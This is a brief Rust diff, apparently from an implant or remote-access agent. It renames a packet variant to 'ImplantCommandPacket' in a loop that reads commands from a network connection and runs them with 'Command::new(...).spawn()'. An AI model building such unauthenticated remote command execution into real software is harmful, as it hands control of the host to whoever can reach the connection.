@@ -35,7 +35,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         let packet = read_packet(&mut connection).unwrap();
 
         match packet {
-            Packet::CommandPacket { command } => {
+            Packet::ImplantCommandPacket { command } => {
                 let command = Command::new(command)
                     .spawn()
                     .unwrap()
